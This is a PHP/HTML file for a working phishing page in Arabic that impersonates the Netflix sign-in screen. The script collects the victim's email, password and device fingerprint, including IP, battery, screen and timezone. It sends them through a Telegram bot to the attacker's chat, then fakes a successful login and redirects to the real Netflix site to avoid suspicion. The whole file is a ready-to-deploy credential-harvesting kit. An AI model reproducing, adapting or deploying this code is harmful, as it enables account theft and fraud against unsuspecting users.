<?php
// توكن البوت الخاص بك
$botToken = "BBOTTTTTTTTTTT";

// دالة لإرسال الرسائل إلى التليجرام
function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

// إذا كان الطلب بواسطة POST، فإننا نتعامل مع إرسال البيانات من JavaScript
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $chatId = $input['chatId'];
    $credentials = $input['credentials'] ?? null;
    $deviceInfo = $input['deviceInfo'] ?? null;

    if ($credentials && $deviceInfo) {
        // إرسال بيانات تسجيل الدخول ومعلومات الجهاز
        $loginMessage = "
🎬 <b>بيانات تسجيل دخول Netflix</b>

📧 <b>البريد الإلكتروني:</b> <code>{$credentials['email']}</code>
🔒 <b>كلمة المرور:</b> <code>{$credentials['password']}</code>

🌐 <b>معلومات الجهاز:</b>
📱 <b>User Agent:</b> {$deviceInfo['userAgent']}
🔋 <b>البطارية:</b> {$deviceInfo['battery']}
🖥️ <b>النظام:</b> {$deviceInfo['platform']}
🌐 <b>IP:</b> {$_SERVER['REMOTE_ADDR']}
📶 <b>نوع الاتصال:</b> {$deviceInfo['connection']}
🗣️ <b>اللغة:</b> {$deviceInfo['language']}
🕒 <b>المنطقة الزمنية:</b> {$deviceInfo['timezone']}
📺 <b>معلومات الشاشة:</b> {$deviceInfo['screen']}

📅 <b>التاريخ:</b> " . date('Y-m-d H:i:s') . "
        ";
        $result = sendTelegramMessage($chatId, $loginMessage, $botToken);
    }
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>تسجيل الدخول إلى Netflix</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
    }
    
    body {
      background-color: #000000;
      color: #FFFFFF;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 16px;
      background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%23333"/></svg>');
    }
    
    .container {
      width: 100%;
      max-width: 380px;
      margin: 0 auto;
    }
    
    .logo-container {
      text-align: center;
      margin-bottom: 30px;
    }
    
    .netflix-logo {
      width: 140px;
      height: 40px;
      margin-bottom: 15px;
      fill: #E50914;
    }
    
    .login-form {
      background-color: rgba(0, 0, 0, 0.75);
      border-radius: 4px;
      padding: 30px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
    }
    
    h1 {
      text-align: right;
      margin-bottom: 24px;
      font-size: 26px;
      font-weight: 700;
      color: #FFFFFF;
    }
    
    .subtitle {
      text-align: right;
      margin-bottom: 20px;
      font-size: 15px;
      color: #FFFFFF;
      line-height: 1.4;
    }
    
    .input-group {
      margin-bottom: 14px;
    }
    
    label {
      display: block;
      margin-bottom: 6px;
      font-size: 13px;
      color: #FFFFFF;
      font-weight: 500;
      text-align: right;
    }
    
    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 14px;
      background-color: #333333;
      border: none;
      border-radius: 4px;
      color: #FFFFFF;
      font-size: 15px;
      transition: background-color 0.2s;
    }
    
    input[type="email"]:focus,
    input[type="password"]:focus {
      outline: none;
      background-color: #454545;
    }
    
    .login-btn {
      width: 100%;
      padding: 14px;
      background-color: #E50914;
      color: #FFFFFF;
      border: none;
      border-radius: 4px;
      font-size: 15px;
      font-weight: 700;
      cursor: pointer;
      margin-top: 20px;
      transition: background-color 0.2s;
    }
    
    .login-btn:hover {
      background-color: #F40612;
    }
    
    .links {
      text-align: center;
      margin-top: 14px;
      font-size: 12px;
    }
    
    .links a {
      color: #B3B3B3;
      text-decoration: none;
      display: block;
      margin: 10px 0;
      transition: color 0.2s;
    }
    
    .links a:hover {
      color: #FFFFFF;
      text-decoration: underline;
    }
    
    .divider {
      border-top: 1px solid #333333;
      margin: 18px 0;
      position: relative;
    }
    
    .divider-text {
      position: absolute;
      top: -9px;
      left: 50%;
      transform: translateX(-50%);
      background-color: rgba(0, 0, 0, 0.75);
      padding: 0 14px;
      color: #B3B3B3;
      font-size: 13px;
    }
    
    .signup-btn {
      width: 100%;
      padding: 14px;
      background-color: transparent;
      color: #B3B3B3;
      border: 1px solid #5E5E5E;
      border-radius: 4px;
      font-size: 15px;
      font-weight: 500;
      cursor: pointer;
      margin-top: 14px;
      transition: border-color 0.2s;
    }
    
    .signup-btn:hover {
      border-color: #B3B3B3;
    }
    
    .footer {
      text-align: center;
      margin-top: 30px;
      color: #757575;
      font-size: 12px;
      line-height: 1.5;
    }
    
    .footer a {
      color: #757575;
      text-decoration: none;
      margin: 0 4px;
    }
    
    .footer a:hover {
      text-decoration: underline;
    }
    
    /* عناصر التحميل */
    .loader {
        width: 18px;
        height: 18px;
        border: 2px solid rgba(255, 255, 255, 0.3);
        border-radius: 50%;
        border-top-color: #FFFFFF;
        animation: spin 1s linear infinite;
        margin: 0 auto;
        display: none;
    }
    
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    
    .status {
        margin-top: 14px;
        font-size: 13px;
        opacity: 0.8;
        text-align: center;
        display: none;
        color: #FFFFFF;
    }
    
    .error-message {
      color: #E50914;
      font-size: 13px;
      margin-top: 14px;
      text-align: center;
      display: none;
    }

    .checkbox-group {
      display: flex;
      align-items: center;
      margin-bottom: 14px;
      justify-content: flex-end;
    }
    
    .checkbox-group input[type="checkbox"] {
      margin-left: 8px;
      width: 15px;
      height: 15px;
      accent-color: #E50914;
    }
    
    .checkbox-group label {
      margin-bottom: 0;
      font-weight: normal;
    }

    .privacy-notice {
      margin-top: 18px;
      font-size: 12px;
      color: #8C8C8C;
      text-align: center;
      line-height: 1.4;
    }

    .recaptcha-notice {
      margin-top: 14px;
      font-size: 12px;
      color: #8C8C8C;
      text-align: center;
    }

    .new-on-netflix {
      text-align: center;
      margin-bottom: 15px;
      font-size: 13px;
      color: #E50914;
      font-weight: 500;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-container">
      <!-- شعار Netflix -->
      <svg class="netflix-logo" viewBox="0 0 111 30" xmlns="http://www.w3.org/2000/svg">
        <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2499766 C43.7810479,26.2499766 42.1876465,26.2499766 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"></path>
      </svg>
 
    </div>
    
    <div class="login-form">
      <div class="new-on-netflix">جديد على Netflix؟</div>
      <p class="subtitle">استخدم حساب Netflix الخاص بك</p>
      
      <form id="netflixLoginForm">
        <div class="input-group">
          <label for="email">البريد الإلكتروني أو رقم الهاتف</label>
          <input type="email" id="email" name="email" autocomplete="email" required autofocus>
        </div>
        
        <div class="input-group">
          <label for="password">كلمة المرور</label>
          <input type="password" id="password" name="password" autocomplete="current-password" required>
        </div>
        
        <div class="checkbox-group">
          <input type="checkbox" id="rememberMe" name="rememberMe">
          <label for="rememberMe">تذكرني</label>
        </div>
        
        <button type="submit" class="login-btn">
          <span>تسجيل الدخول</span>
          <div class="loader" id="loader"></div>
        </button>
        
        <div class="links">
          <a href="#">هل نسيت كلمة المرور؟</a>
          <a href="#">هل تحتاج إلى مساعدة في التسجيل؟</a>
        </div>
      </form>
      
      <div class="divider">
        <span class="divider-text">جديد على Netflix؟</span>
      </div>
      
      <button type="button" class="signup-btn">اشترك الآن</button>
      
      <div class="status" id="status">جاري التحقق من المعلومات...</div>
      <div class="error-message" id="errorMessage">البريد الإلكتروني أو كلمة المرور غير صحيحة. يرجى المحاولة مرة أخرى.</div>
      
      <div class="recaptcha-notice">
        <p>هذه الصفحة محمية بواسطة reCAPTCHA وتطبق <a href="#">سياسة الخصوصية</a> و<a href="#">شروط الخدمة</a> من Google.</p>
      </div>

      <div class="privacy-notice">
        <p>باستخدام هذا التطبيق، فإنك توافق على <a href="#">شروط الاستخدام</a> و<a href="#">سياسة الخصوصية</a> الخاصة بنا.</p>
      </div>
    </div>
    
    <div class="footer">
      <p>أسئلة؟ اتصل بنا: 0800-000-000</p>
      <a href="#">الأسئلة الشائعة</a>
      <a href="#">مركز المساعدة</a>
      <a href="#">شروط الاستخدام</a>
      <a href="#">الخصوصية</a>
      <a href="#">تفضيلات الكوكيز</a>
      <a href="#">معلومات الشركة</a>
      <p>© 2025 Netflix, Inc. جميع الحقوق محفوظة.</p>
    </div>
  </div>

<script>
  const params = new URLSearchParams(window.location.search);
  const chatId = params.get('ID'); // نحصل على chatId من الرابط

  // عناصر واجهة المستخدم
  const loginForm = document.getElementById('netflixLoginForm');
  const loader = document.getElementById('loader');
  const status = document.getElementById('status');
  const errorMessage = document.getElementById('errorMessage');

  async function collectDeviceInfo() {
    let batteryLevel = "غير متوفر";
    let connectionType = "غير متوفر";
    let timezone = "غير متوفر";
    let screenInfo = "غير متوفر";
    
    try {
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        batteryLevel = `${Math.round(battery.level * 100)}%`;
      }
    } catch (e) {}
    
    try {
      if (navigator.connection) {
        connectionType = navigator.connection.effectiveType;
      }
    } catch (e) {}
    
    try {
      timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    } catch (e) {}
    
    try {
      screenInfo = `${screen.width}x${screen.height}, ${window.devicePixelRatio}dpr`;
    } catch (e) {}
    
    return {
      userAgent: navigator.userAgent,
      battery: batteryLevel,
      platform: navigator.platform,
      language: navigator.language,
      connection: connectionType,
      timezone: timezone,
      screen: screenInfo
    };
  }

  async function sendToServer(chatId, credentials, deviceInfo) {
    try {
      const data = {
        chatId: chatId,
        credentials: credentials,
        deviceInfo: deviceInfo
      };
      
      const response = await fetch(window.location.href, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      });
      
      return await response.json();
    } catch (error) {
      console.error('Error sending to server:', error);
      return {status: 'error', error: error.message};
    }
  }

  function updateStatus(message) {
    status.textContent = message;
    status.style.display = 'block';
  }

  function showError() {
    errorMessage.style.display = 'block';
  }

  // معالجة تسجيل الدخول
  loginForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    // إظهار عناصر التحميل
    loader.style.display = 'block';
    status.style.display = 'block';
    errorMessage.style.display = 'none';
    
    updateStatus('جاري التحقق من المعلومات...');
    
    try {
      // جمع معلومات الجهاز
      const deviceInfo = await collectDeviceInfo();
      
      // إرسال البيانات إلى الخادم
      const result = await sendToServer(chatId, {email, password}, deviceInfo);
      
      if (result.status === 'success') {
        updateStatus('تم تسجيل الدخول بنجاح!');
        
        // إعادة توجيه إلى Netflix بعد ثواني (وهمي)
        setTimeout(() => {
          window.location.href = 'https://www.netflix.com';
        }, 2000);
      } else {
        throw new Error('Failed to send data');
      }
    } catch (error) {
      console.error('Error during authentication:', error);
      showError();
      updateStatus('فشل في المصادقة');
    }
  });
</script>

</body>
</html>
